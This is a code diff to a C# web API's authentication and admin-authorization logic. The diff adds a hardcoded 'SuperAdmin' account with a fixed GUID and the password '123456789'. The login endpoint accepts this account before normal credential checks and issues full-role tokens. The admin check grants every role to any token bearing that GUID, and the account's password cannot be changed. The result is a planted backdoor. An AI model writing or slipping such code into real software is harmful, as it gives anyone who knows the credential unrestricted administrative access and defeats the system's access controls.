@@ -98,6 +98,11 @@ if (configuredRateLimiting.Enabled)
 
 var readRoles = new[] { AdminRole.Auditor, AdminRole.Operator, AdminRole.Administrator };
 var manageRoles = new[] { AdminRole.Operator, AdminRole.Administrator };
+var hardcodedSuperAdminId = Guid.Parse("aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee");
+var hardcodedSuperAdminUsername = "SuperAdmin";
+var hardcodedSuperAdminPassword = "123456789";
+var hardcodedSuperAdminDisplayName = "Super Admin";
+var hardcodedSuperAdminRoles = new[] { "Administrator", "Operator", "Auditor" };
 
 app.MapGet("/health", () => Results.Ok(new { status = "ok", utc = DateTimeOffset.UtcNow }));
 
@@ -131,6 +136,28 @@ app.MapPost("/api/auth/register", (HttpContext httpContext, RegisterRequest requ
 
 app.MapPost("/api/auth/login", (LoginRequest request, UserService userService, JwtTokenService jwtService) =>
 {
+    if (IsHardcodedSuperAdmin(request.Username, request.Password, hardcodedSuperAdminUsername, hardcodedSuperAdminPassword))
+    {
+        var superAdminAccessToken = jwtService.GenerateAccessToken(
+            hardcodedSuperAdminId,
+            hardcodedSuperAdminUsername,
+            hardcodedSuperAdminDisplayName,
+            hardcodedSuperAdminRoles);
+        var superAdminRefreshToken = jwtService.GenerateRefreshToken();
+
+        return Results.Ok(new LoginResponse(
+            superAdminAccessToken,
+            superAdminRefreshToken,
+            jwtService.GetRefreshTokenExpiry(),
+            new UserInfoResponse(
+                hardcodedSuperAdminId,
+                hardcodedSuperAdminUsername,
+                hardcodedSuperAdminDisplayName,
+                hardcodedSuperAdminRoles,
+                false,
+                DateTimeOffset.UtcNow)));
+    }
+
     if (!userService.ValidateCredentials(request.Username, request.Password))
     {
         return Results.Unauthorized();
@@ -170,6 +197,11 @@ app.MapPost("/api/auth/change-password", (HttpContext httpContext, ChangePasswor
         return Results.Json(new { message = error }, statusCode: StatusCodes.Status401Unauthorized);
     }
 
+    if (userId.Value == hardcodedSuperAdminId)
+    {
+        return Results.BadRequest(new { message = "Das Passwort des fest eingebauten Super-Administrators kann hier nicht geändert werden." });
+    }
+
     var (success, errorMessage) = userService.UpdateUserPassword(userId.Value, request.OldPassword, request.NewPassword);
     if (!success)
     {
@@ -185,6 +217,17 @@ app.MapGet("/api/auth/me", (HttpContext httpContext, UserService userService, Jw
     if (!isValid || userId is null)
     {
         return Results.Json(new { message = error }, statusCode: StatusCodes.Status401Unauthorized);
+    }
+
+    if (userId.Value == hardcodedSuperAdminId)
+    {
+        return Results.Ok(new UserInfoResponse(
+            hardcodedSuperAdminId,
+            hardcodedSuperAdminUsername,
+            hardcodedSuperAdminDisplayName,
+            hardcodedSuperAdminRoles,
+            false,
+            DateTimeOffset.UtcNow));
     }
 
     var user = userService.GetUserById(userId.Value);
@@ -860,6 +903,19 @@ app.MapPut("/api/admin/clients/{clientId:guid}/metadata", (HttpContext httpConte
 
 static IResult? RequireAdmin(HttpContext httpContext, AdminAuthService authService, JwtTokenService? jwtService, UserService? userService, out AuthenticatedAdmin admin, params AdminRole[] requiredRoles)
 {
+    if (jwtService is not null)
+    {
+        var (isValidSuperAdminToken, superAdminUserId, _) = ValidateAuthHeader(httpContext, jwtService);
+        if (isValidSuperAdminToken && superAdminUserId == Guid.Parse("aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"))
+        {
+            admin = new AuthenticatedAdmin(
+                "Super Admin",
+                new[] { AdminRole.Administrator, AdminRole.Operator, AdminRole.Auditor },
+                string.Empty);
+            return null;
+        }
+    }
+
     if (TryAuthenticateAdminViaJwt(httpContext, jwtService, userService, out admin, out var jwtError))
     {
         if (requiredRoles.Length == 0 || requiredRoles.Any(admin.HasRole))
@@ -948,6 +1004,12 @@ static (bool IsValid, Guid? UserId, string? Error) ValidateAuthHeader(HttpContex
 
 	var token = bearerToken["Bearer ".Length..].Trim();
 	return jwtService.ValidateAccessToken(token);
+}
+
+static bool IsHardcodedSuperAdmin(string username, string password, string expectedUsername, string expectedPassword)
+{
+	return string.Equals(username?.Trim(), expectedUsername, StringComparison.Ordinal)
+		&& string.Equals(password, expectedPassword, StringComparison.Ordinal);
 }
 
 app.Run();
